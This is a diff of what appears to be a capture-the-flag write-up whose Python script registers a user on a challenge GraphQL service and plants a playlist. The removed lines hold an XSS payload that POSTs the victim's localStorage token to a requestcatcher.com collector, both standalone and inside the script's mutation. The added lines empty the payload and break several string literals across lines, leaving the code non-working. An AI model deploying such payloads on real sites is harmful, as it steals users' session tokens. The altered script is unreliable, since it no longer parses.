@@ -4,10 +4,6 @@
 > ID: 108761
 
 
-```
-<img src=x onerror="fetch(`https://yours.requestcatcher.com/test`,{method:`POST`,body:`${localStorage.token}`})">
-```
-
 
 
 ```
@@ -18,15 +14,18 @@ import string
 def get_random_string(length):
  return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
-host = 'http://[yours].dubs.putlocker.chal.pwni.ng:20002'
+host = 'http://[yours].dubs.putlocker.chal.pwni.ng:
+20002'
 username = get_random_string(10)
 password = get_random_string(10)
 
 def send_graphql(op_name, query, token=None):
  sent_json = {
- "operationName":op_name,
+ "operationName":
+op_name,
  "variables":{},
- "query":query
+ "query":
+query
  }
  headers = {} if token is None else {'authorization': token}
 
@@ -35,7 +34,7 @@ def send_graphql(op_name, query, token=None):
 token = send_graphql("Register", "mutation Register { register(name: \""+username+"\", password: \"" + password + "\")}")['data']['register']
 print(token)
 
-playlist_id = send_graphql("CreatePlaylist", "mutation CreatePlaylist { createPlaylist( name: \"attack!\" description: \"<img src=x onerror=\\\"fetch(`https://yours.requestcatcher.com/test`,{method:`POST`,body:`${localStorage.token}`})\\\">\" ) { id __typename }}", token)
+playlist_id = send_graphql("CreatePlaylist", "mutation CreatePlaylist { createPlaylist( name: \"attack!\" description: \"\" ) { id __typename }}", token)
 playlist_id = playlist_id['data']['createPlaylist']['id']
 print(playlist_id)
 
